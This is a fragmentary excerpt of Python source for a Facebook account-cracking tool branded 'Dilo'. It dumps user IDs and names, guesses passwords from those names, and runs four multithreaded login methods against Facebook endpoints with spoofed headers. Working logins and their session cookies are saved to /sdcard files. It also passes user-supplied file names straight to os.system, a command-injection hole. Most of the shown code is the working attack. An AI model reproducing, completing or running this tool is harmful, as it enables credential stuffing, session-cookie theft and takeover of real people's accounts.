...
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
    ...
    try:
        ...
        os.system('am start https://wa.me/+923154619676?text=' + tks)

        

    r1=requests.get("https://github.com/Diloking/Laghari/blob/main/tttt").text
    ...
    if key1 in r1:
        ...
        os.system("clear")
logo =                                          """            
\033[1;37m   8888888b.  d8b 888
\033[1;37m   888  "Y88b Y8P 888
\033[1;37m   888    888     888
\033[1;37m   888    888 888 888  .d88b.
\033[1;37m   888    888 888 888 d88""88b
\033[1;37m   888    888 888 888 888  888 
\033[1;37m   888  .d88P 888 888 Y88..88P  
\033[1;37m   8888888P"  888 888  "Y88P"
\033[1;37m------------------------------------------------
\033[1;37m Owner   :      Dilo King 
\033[1;37m Whatspp:     +923154619676
\033[1;37m Github  :       Diloking
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Dilo Menu ")
        exit()
...
def Dilo():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/CNaxV2HTYMmLmnCBFqp0O0')
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/1147370869269844//')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        Dilo(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Dilo] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Dilob = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Dilob};{ckkk}"
                    print(f"\r{R} [Dilo-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Dilo_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Dilo_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Dilo-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Dilo_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Dilo] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Dilo-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Dilo_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Dilo_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Dilo-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Dilo] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Dilo] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Dilo-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Dilo_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with DiloDilo(max_workers=30) as Diloworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Diloworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Diloworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Diloworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Diloworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/Dilo.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/Dilo.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    Dilo = input('Put File Name :')
    print(" ")
    Dilo = input('Saving Put File Name :')
    os.system('touch ' +Dilo)
    os.system('sort -r '+Dilo+' | uniq > '+Dilo)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + Dilo )
    print(47*'-')
    print("File Saved To :" + Dilo )
    print(47*'-')
    input(f"{S} Press Enter To Back Dilo Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/Dilo.txt\n') 
        filepath = input("Put File Name: ")
